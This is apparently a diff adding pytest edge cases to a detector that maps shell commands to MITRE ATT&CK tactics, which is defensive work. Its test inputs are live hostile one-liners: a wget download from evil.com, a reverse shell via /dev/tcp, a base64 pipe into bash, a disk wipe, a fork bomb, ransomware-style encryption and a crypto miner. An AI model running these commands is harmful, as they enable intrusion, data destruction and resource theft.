@@ -118,3 +118,83 @@ class TestMitreAnnotation:
                 continue
             assert isinstance(val, (int, float)), \
                 f"Non-numeric value for {key}: {val}"
+
+    # ── Additional Edge Cases ──
+
+    def test_command_chaining(self):
+        """Multiple commands in one string should all be analyzed."""
+        # Commands separated by && or ; should each trigger detection
+        tactics = self._get_tactics([
+            "cat /etc/passwd && wget http://evil.com/bot"
+        ])
+        # Should detect both credential_access and command_and_control
+        tactic_names = " ".join(tactics)
+        assert "credential" in tactic_names or "discovery" in tactic_names
+        assert "command_and_control" in tactic_names or "initial_access" in tactic_names
+
+    def test_case_insensitive_matching(self):
+        """Patterns should be case-insensitive."""
+        tactics_upper = self._get_tactics(["CAT /ETC/SHADOW"])
+        tactics_lower = self._get_tactics(["cat /etc/shadow"])
+        # Both should detect credential access
+        assert any("credential" in t.lower() for t in tactics_upper)
+        assert any("credential" in t.lower() for t in tactics_lower)
+
+    def test_base64_decode_detection(self):
+        """Base64 decoding should trigger defense_evasion (T1140)."""
+        tactics = self._get_tactics(["echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | bash"])
+        assert any("defense_evasion" in t for t in tactics), \
+            f"Expected defense_evasion for base64 decode, got {tactics}"
+
+    def test_reverse_shell_detection(self):
+        """Reverse shell patterns should trigger execution (T1059.004)."""
+        tactics = self._get_tactics(["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"])
+        assert any("execution" in t for t in tactics), \
+            f"Expected execution for reverse shell, got {tactics}"
+
+    def test_ransomware_detection(self):
+        """OpenSSL encryption should trigger impact (T1486)."""
+        tactics = self._get_tactics(["openssl enc -aes-256-cbc -in /data -out /data.enc"])
+        assert any("impact" in t for t in tactics), \
+            f"Expected impact for ransomware pattern, got {tactics}"
+
+    def test_disk_wipe_detection(self):
+        """DD disk wipe should trigger impact (T1561.001)."""
+        tactics = self._get_tactics(["dd if=/dev/zero of=/dev/sda"])
+        assert any("impact" in t for t in tactics), \
+            f"Expected impact for disk wipe, got {tactics}"
+
+    def test_fork_bomb_detection(self):
+        """Fork bomb should trigger impact (T1499.004)."""
+        tactics = self._get_tactics([":(){ :|:& };:"])
+        assert any("impact" in t for t in tactics), \
+            f"Expected impact for fork bomb, got {tactics}"
+
+    def test_crypto_mining_detection(self):
+        """XMRig/miner references should trigger impact (T1496)."""
+        tactics = self._get_tactics(["./xmrig -o pool.minexmr.com:4444"])
+        assert any("impact" in t for t in tactics), \
+            f"Expected impact for mining, got {tactics}"
+
+    def test_empty_session(self):
+        """Empty session should produce zero annotation."""
+        ann = annotate_session([])
+        assert ann["total_commands"] == 0
+        assert ann["matched_commands"] == 0
+        assert ann["kill_chain_score"] == 0
+        assert ann["unique_technique_count"] == 0
+        assert all(v == 0 for v in ann["tactic_vector"].values())
+
+    def test_severity_tier_categorization(self):
+        """Severity tier should map correctly."""
+        # Low severity commands
+        ann_low = annotate_session(["ls -la", "pwd"])
+        assert ann_low["severity_tier"] in ["low", "none", "medium"]
+        
+        # High severity commands
+        ann_high = annotate_session(["cat /etc/shadow", "wget http://c2/bot && chmod +x bot && ./bot"])
+        assert ann_high["severity_tier"] in ["high", "critical", "emergency"]
+
+
+if __name__ == "__main__":
+    pytest.main([__file__, "-v"])
